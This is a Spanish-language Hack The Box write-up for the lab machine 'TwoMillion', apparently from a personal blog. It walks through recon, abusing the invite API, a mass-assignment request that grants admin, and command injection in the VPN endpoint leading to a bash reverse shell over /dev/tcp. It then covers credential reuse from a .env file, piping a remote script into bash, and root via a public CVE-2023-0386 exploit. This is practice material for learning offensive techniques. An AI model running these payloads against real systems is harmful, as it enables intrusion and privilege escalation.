---
layout: single
title: TwoMillion - Hack The Box
excerpt: "Explotación de Api"
date: 2024-01-03
classes: wide
header:
  teaser: /assets/images/htb-ransom/ransom1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - nginx
  - API
  - kernel
---

# 10.10.11.221 TwoMillion

![](/assets/images/htb-2million/2million1.png)

----------------------------
# 1. Reconocimiento

Hacemos un escaneo de puertos con nmap

```bash
$: sudo nmap -sCV 10.10.11.221 -p- --open -sS --min-rate 5000 -n -Pn -vvv
...
Discovered open port 80/tcp on 10.10.11.221
Discovered open port 22/tcp on 10.10.11.221
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5
kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como pone "2million.htb" vamos a asociar este dominio a la ip en `/etc/hosts`. En whatweb nos dice que es un `nginx`

```bash
$: whatweb http://2million.htb/  
http://2million.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTM
L5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration 
Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx
```
![](/assets/images/htb-2million/2million2.png)
Si hacemos fuzzing vemos los directorios:

```bash
$: wfuzz -t 200 --hc=404,301 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://2million.h
tb/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000051:   200        94 L     293 W      4527 Ch     "register"
000000039:   200        80 L     232 W      3704 Ch     "login"
000000024:   302        0 L      0 W        0 Ch        "home"
000001012:   401        0 L      0 W        0 Ch        "api"
000001211:   302        0 L      0 W        0 Ch        "logout"
000007922:   200        96 L     285 W      3859 Ch     "invite"
000045226:   200        1242 L   3326 W     64952 Ch    "http://2million.htb/"
```

`/invite` parece interesante, si le hacemos una peticion curl

```bash
$: curl -s http://2million.htb/invite | grep "/"  
...
    <script defer src="/js/inviteapi.min.js"></script>
                    url: '/api/v1/invite/verify',
...

$: curl -s http://2million.htb/js/inviteapi.min.js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toS
tring(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c])
{p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d
/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})
}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|e
rror|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Si vamos a [de4js](https://lelinhtinh.github.io/de4js/) podremos de-ofuscar el codigo, quedando así:
![](/assets/images/htb-2million/2million3.png)

```bash
$: cat inviteapi.js 
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response)} })} 

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response)} })}

$: curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate -H "content-type: application/json"
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/v
aivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption typ
e in order to decrypt it..."}
```

Le hacemos ROT13 en la web de [rot13](https://rot13.com/) y queda el mensaje:
`In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate'`

---------------------------

# 2. Explotación de la API

Hacemos dicha petición, como es una api, tendremos que hacer peticiones en json y poner la cabecera `Content-Type: application/json`

```bash
$: curl -s -X POST http://2million.htb/api/v1/invite/generate -d '{"code":""}' -H "Content-Type: application/json"  
{"0":200,"success":1,"data":{"code":"R000V0YtN0hBTVgtT0pEUDgtUldGVEU=","format":"encoded"}} 

$: curl -sv -X POST http://2million.htb/api/v1/invite/verify -d '{"code":"R000V0YtN0hBTVgtT0pEUDgtUldGVEU="}' -H "Content-Type: application/json"
Set-Cookie: PHPSESSID=bq0vegd024sflnvbpvro6ccmri; path=/
{"0":400,"success":0,"error":{"message":"Missing parameter: code"}}

$: echo "R000V0YtN0hBTVgtT0pEUDgtUldGVEU=" | base64 -d
GM4WF-7HAMX-OJDP8-RWFTE
```
YA hemos conseguido el código, asi que nos registramos en la web con ese código en `/invite` lo que nos redirige a la web de `/login` de ahí a `/register` y de ahi pasamos a `/login`
Se nos setea la cookie `PHPSESSID=bq0vegd024sflnvbpvro6ccmri`, que usaremos para interactuar con la api

![](/assets/images/htb-2million/2million4.png)
![](/assets/images/htb-2million/2million5.png)
![](/assets/images/htb-2million/2million6.png)
![](/assets/images/htb-2million/2million7.png)

```bash
$: curl -s http://2million.htb/api --cookie "PHPSESSID=bq0vegd024sflnvbpvro6ccmri"
{"\/api\/v1":"Version 1 of the API"}

$: curl -s http://2million.htb/api/v1 --cookie "PHPSESSID=bq0vegd024sflnvbpvro6ccmri" | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }}}
```

Estas son todas las rutas, la de update, tiene pinra de ser vulnerable a un `MASS-ASIGNMENT ATTACK`

```bash
$: curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=bq0vegd024sflnvbpvro6ccmri" -H "Content-Type: application/json"
{"status":"danger","message":"Missing parameter: email"}

$: curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=bq0vegd024sflnvbpvro6ccmri" \
-H "Content-Type: application/json" -d'{"email":"cucuxii@cucuxii.com"}'
{"status":"danger","message":"Missing parameter: is_Admin"}

$: curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=bq0vegd024sflnvbpvro6ccmri" \
-H "Content-Type: application/json" -d '{"email":"cucuxii@test.com", "is_admin":"True"}'
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}

$: curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=bq0vegd024sflnvbpvro6ccmri" \
-H "Content-Type: application/json" -d '{"email":"cucuxii@test.com", "is_admin":1}'
{"id":70,"username":"cucuxii","is_admin":1}   

$: curl -s -X GET http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=bq0vegd024sflnvbpvro6ccmri"
{"message":true}
```

Siendo admins la unica ruta que tenemos es `/vpn/generate`, vamos a probar si es vilnerable a RCE

```bash
$: curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=3at041srm7ne3j3psmut4blqp4" -H "Content-Type: application/json" -d '{"username":"cucuxii; ping -c 1 10.10.15.20"}'

$: sudo tcpdump -i tun0 icmp -n
[sudo] password for jessica:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:02:20.187069 IP 10.10.11.221 > 10.10.15.20: ICMP echo request, id 10, seq 1, length 64
19:02:20.187088 IP 10.10.15.20 > 10.10.11.221: ICMP echo reply, id 10, seq 1, length 64
```
Como lo es, nos entablaremos una shell
```bash
$: curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=3at041srm7ne3j3psmut4blqp4" -H 
"Content-Type: application/json" -d $'{\"username\":\"cucuxii; bash -c \'bash -i >& /dev/tcp/10.10.15.20/443 0
>&1\'\"}'
```

---------------------------

# 3. Escalada de privilegios

Accedemos como www-data
```bash
www-data@2million:/var/www/html$ ls /var/www/html
assets  controllers  css  Database.php  fonts  images  index.php  js  Router.php  views  VPN
```
Lo que suelo hacer cuando estoy en un directorio web, es buscar por la palabra password (grep recursivo case-insensitive)
```bash
www-data@2million:/var/www/html$ grep -ri "password"
.env:DB_PASSWORD=SuperDuperPass123
...
```
El archivo `.env` es el tiene información de configuración de servidores nginx. Por tanto ya podemos hacer ssh como admin 

```bash
$: ssh admin@2million.htb
admin@2million.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
...
admin@2million:~$
```
Si subo mi herramienta de reconocimiento [] encuentro que hay un mail

```bash
admin@2million:~$ curl -s 10.10.15.20/lin_info_xii.sh | bash
  >  Mails
/var/mail/.
/var/mail/..
/var/mail/admin
admin@2million:~$ cat /var/mail/*    
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also up
grade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in O
verlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
Nos habla de una vulnerabilidad en el kernel relacionado con OverlayFS / FUSE. Buscandolo en internet doy con  el CVE-2023-0386.
En este [repo](https://github.com/sxlmnwb/CVE-2023-0386) dicen como explotarlo . Lo clono a mi kali

```bash
$: git clone https://github.com/sxlmnwb/CVE-2023-0386 &>/dev/null
$: tar -zcvf 2023.tar.gz CVE-2023-0386
```

Con el tar, lo trasnfiero a la maquina victima con un servidor de python `python3 -m http-server 80`
```bash
$: curl http://10.10.15.20/2023.tar.gz > 2023.tar.gz
$: tar -zcvf 2023.tar.gz CVE-2023-0386
CVE-2023-0386/
CVE-2023-0386/Makefile
...
admin@2million:~$ cd CVE-2023-0386
```
Seguimos las instrucciones y escalamos a root.
```bash
admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
mkdir: File exists
fuse: mountpoint is not empty
fuse: if you are sure this is safe, use the 'nonempty' mount option
fuse_mount: File exists

admin@2million:~/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jan  8 19:02 .
drwxr-xr-x 6 root   root     4096 Jan  8 19:02 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386# sudo whoami
root
```
